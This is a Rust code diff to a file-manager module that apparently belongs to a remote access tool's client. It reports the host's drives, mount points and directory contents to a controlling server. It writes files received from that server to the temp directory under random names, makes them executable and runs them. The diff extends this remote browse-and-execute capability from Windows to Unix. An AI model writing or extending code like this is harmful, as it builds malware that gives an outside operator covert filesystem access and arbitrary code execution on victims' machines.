@@ -7,6 +7,12 @@ pub struct FileManager {
     pub current_path: PathBuf,
 }
 
+impl Default for FileManager {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
 impl FileManager {
     pub fn new() -> Self {
         Self {
@@ -28,9 +34,18 @@ impl FileManager {
         &mut self,
         folder: &str,
     ) {
-        self.current_path.push(folder);
-        self.list_directory_contents().await;
-        self.write_current_folder().await;
+        let new_path = self.current_path.join(folder);
+        if new_path.exists() && new_path.is_dir() && new_path.read_dir().is_ok() {
+            self.current_path = new_path;
+            self.list_directory_contents().await;
+            self.write_current_folder().await;
+        } else {
+            eprintln!("Cannot access directory: {}", new_path.display());
+            // Send empty file list to indicate error
+            let _ = send_packet(ServerboundPacket::FileList(Vec::new())).await;
+            // Reset current path to root
+            let _ = send_packet(ServerboundPacket::CurrentFolder("".to_string())).await;
+        }
     }
 
     pub async fn navigate_to_parent(&mut self) {
@@ -90,6 +105,10 @@ impl FileManager {
             let _ = send_packet(ServerboundPacket::FileList(file_entries)).await;
         } else {
             eprintln!("Could not read directory: {}", self.current_path.display());
+            // Send empty file list to indicate error
+            let _ = send_packet(ServerboundPacket::FileList(Vec::new())).await;
+            // Reset current path to root
+            let _ = send_packet(ServerboundPacket::CurrentFolder("".to_string())).await;
         }
     }
 
@@ -109,7 +128,7 @@ impl FileManager {
         let temp_dir = std::env::temp_dir();
         
         let random_num: u64 = rand::random();
-        let random_name = format!("file_{}.exe", random_num);
+        let (random_name, _extension) = get_executable_name(random_num);
         
         let file_path = temp_dir.join(random_name);
         
@@ -118,17 +137,21 @@ impl FileManager {
             return;
         }
         
+        // Make file executable on Unix systems
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            if let Ok(mut perms) = std::fs::metadata(&file_path).map(|m| m.permissions()) {
+                perms.set_mode(0o755);
+                let _ = std::fs::set_permissions(&file_path, perms);
+            }
+        }
+        
         self.execute_file(&file_path.to_string_lossy()).await;
     }
     
     pub async fn execute_file(&self, path: &str) {
-        match std::process::Command::new("cmd.exe")
-            .args(["/c", "start", "", path])
-            .spawn() 
-        {
-            Ok(_) => println!("Successfully executed file: {}", path),
-            Err(e) => eprintln!("Failed to execute file: {}", e),
-        }
+        platform_execute_file(path).await;
     }
     
     pub async fn upload_file(&self, target_folder: String, file_data: FileData) {
@@ -148,6 +171,8 @@ impl FileManager {
     }
 }
 
+// Platform-specific implementations
+#[cfg(windows)]
 fn get_available_disks() -> Vec<String> {
     let arr = [
         "A",
@@ -186,4 +211,115 @@ fn get_available_disks() -> Vec<String> {
     }
 
     available
+}
+
+#[cfg(unix)]
+fn get_available_disks() -> Vec<String> {
+    let mut available: Vec<String> = Vec::new();
+    
+    // Add root filesystem
+    available.push("/".to_string());
+    
+    // Common mount points to check
+    let common_mounts = [
+        "/home",
+        "/usr",
+        "/var",
+        "/tmp",
+        "/opt",
+        "/boot",
+        "/mnt",
+        "/media",
+    ];
+    
+    for mount in &common_mounts {
+        if std::path::Path::new(mount).exists() && std::path::Path::new(mount).is_dir() {
+            available.push(mount.to_string());
+        }
+    }
+    
+    // Try to read /proc/mounts to get actual mounted filesystems
+    if let Ok(mounts_content) = std::fs::read_to_string("/proc/mounts") {
+        for line in mounts_content.lines() {
+            let parts: Vec<&str> = line.split_whitespace().collect();
+            if parts.len() >= 2 {
+                let mount_point = parts[1];
+                // Skip special filesystems and duplicates
+                if !mount_point.starts_with("/proc") 
+                    && !mount_point.starts_with("/sys") 
+                    && !mount_point.starts_with("/dev") 
+                    && !mount_point.starts_with("/run")
+                    && mount_point != "/"
+                    && !available.contains(&mount_point.to_string())
+                    && std::path::Path::new(mount_point).is_dir() {
+                    available.push(mount_point.to_string());
+                }
+            }
+        }
+    }
+    
+    available
+}
+
+#[cfg(windows)]
+fn get_executable_name(random_num: u64) -> (String, &'static str) {
+    (format!("file_{}.exe", random_num), ".exe")
+}
+
+#[cfg(unix)]
+fn get_executable_name(random_num: u64) -> (String, &'static str) {
+    (format!("file_{}", random_num), "")
+}
+
+#[cfg(windows)]
+async fn platform_execute_file(path: &str) {
+    match std::process::Command::new("cmd.exe")
+        .args(["/c", "start", "", path])
+        .spawn() 
+    {
+        Ok(_) => println!("Successfully executed file: {}", path),
+        Err(e) => eprintln!("Failed to execute file: {}", e),
+    }
+}
+
+#[cfg(unix)]
+async fn platform_execute_file(path: &str) {
+    // Normalize path separators and ensure proper formatting
+    let path = path.replace('\\', "/");
+    
+    // Ensure path starts with "/" and has proper separators
+    let path = if path.starts_with('/') {
+        path.to_string()
+    } else {
+        format!("/{}", path)
+    };
+
+    // Try to open with xdg-open first (most Linux distributions)
+    match std::process::Command::new("xdg-open")
+        .arg(&path)
+        .spawn() 
+    {
+        Ok(_) => println!("Successfully opened file: {}", path),
+        Err(e) => {
+            eprintln!("Failed to open with xdg-open: {}", e);
+            // Try with gio-open (GNOME)
+            match std::process::Command::new("gio")
+                .args(["open", &path])
+                .spawn() 
+            {
+                Ok(_) => println!("Successfully opened file with gio: {}", path),
+                Err(e2) => {
+                    eprintln!("Failed to open with gio: {}", e2);
+                    // Try with gnome-open (older GNOME)
+                    match std::process::Command::new("gnome-open")
+                        .arg(&path)
+                        .spawn() 
+                    {
+                        Ok(_) => println!("Successfully opened file with gnome-open: {}", path),
+                        Err(e3) => eprintln!("Failed to open file with any method: {}", e3),
+                    }
+                }
+            }
+        }
+    }
 }
